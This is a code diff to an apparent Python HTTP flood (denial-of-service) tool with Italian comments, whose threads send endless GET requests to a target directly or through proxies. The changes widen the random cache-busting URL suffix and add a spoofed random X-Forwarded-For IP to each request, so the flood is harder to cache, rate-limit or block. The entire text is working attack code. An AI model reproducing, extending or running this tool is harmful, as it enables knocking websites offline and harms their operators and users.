@@ -915,7 +915,7 @@ class RequestProxyHTTP(threading.Thread): # la classe del multithreading
 			try:
 				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # ecco il nostro socket
 				s.connect((str(proxy[0]), int(proxy[1]))) # connessione al proxy
-				request = "GET " + url + str(random.randint(0,500)) + " HTTP/1.1\r\nHost: " + url2 + "\r\n" + useragent + accept + forward + connection + "\r\n"  # ecco la final request
+				request = "GET " + url + str(random.randint(0,90000)) + " HTTP/1.1\r\nHost: " + url2 + "\r\n" + useragent + accept + forward + connection + "\r\n"  # ecco la final request
 				s.send(str.encode(request)) # encode in bytes della richiesta HTTP
 				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print delle richieste
 				try: # invia altre richieste nello stesso thread
@@ -981,6 +981,8 @@ class RequestDefaultHTTP(threading.Thread): # la classe del multithreading
 		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" # useragent a caso
 		accept = random.choice(acceptall) # accept a caso
 		request = get_host + useragent + accept + connection + "\r\n" # composizione final request
+		randomip = str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255))
+		forward = "X-Forwarded-For: " + randomip + "\r\n"
 		go.wait() # aspetta che i threads siano pronti
 		while True:
 			try:
@@ -990,6 +992,9 @@ class RequestDefaultHTTP(threading.Thread): # la classe del multithreading
 				print ("Request sent! @", self.counter) # print req + counter
 				try: # invia altre richieste nello stesso thread
 					for y in range(multiple): # fattore di moltiplicazione
+						randomip = str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255))
+						forward = "X-Forwarded-For: " + randomip + "\r\n"
+						request = "GET " + url + str(random.randint(0,900000)) + " HTTP/1.1\r\nHost: " + url2 + "\r\n" + useragent + accept + forward + connection + "\r\n"  # ecco la final request
 						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
 				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
 					s.close()
